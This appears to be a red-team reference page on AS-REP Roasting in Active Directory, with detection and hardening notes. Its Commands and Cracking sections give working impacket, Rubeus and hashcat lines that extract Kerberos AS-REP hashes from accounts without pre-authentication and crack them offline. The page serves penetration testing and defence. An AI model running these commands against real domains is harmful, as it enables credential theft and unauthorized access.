---
title: "AS-REP Roasting"
category: "red-team"
tags: ["active-directory", "kerberos", "credential-access"]
platform: "windows"
mitre: ["T1558.004"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# AS-REP Roasting

## TL;DR
Accounts with Kerberos pre-auth disabled (`DONT_REQ_PREAUTH`) hand over a password-encrypted portion of the AS-REP **without authentication** → offline crack. You don't even need valid credentials if you have a user list.

## Commands
```bash
# No credentials – just a user list
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -format hashcat

# With credentials – find vulnerable accounts
impacket-GetNPUsers corp.local/user:'Pass' -dc-ip 10.10.10.10 -request -format hashcat
```
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

## Cracking
```bash
hashcat -m 18200 hashes.txt rockyou.txt   # Kerberos 5 AS-REP etype 23
```

## Detection (Blue Team)
- Event **4768** (AS-REQ) with pre-auth type 0 / no pre-auth.
- Enumeration of many accounts without pre-auth from one source.

## Mitigation / Hardening
- Enable Kerberos pre-auth on all accounts (remove `DONT_REQ_PREAUTH`).
- Long passwords/AES; audit accounts with this flag:
```powershell
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol
```

## Sources
- [MITRE T1558.004](https://attack.mitre.org/techniques/T1558/004/)
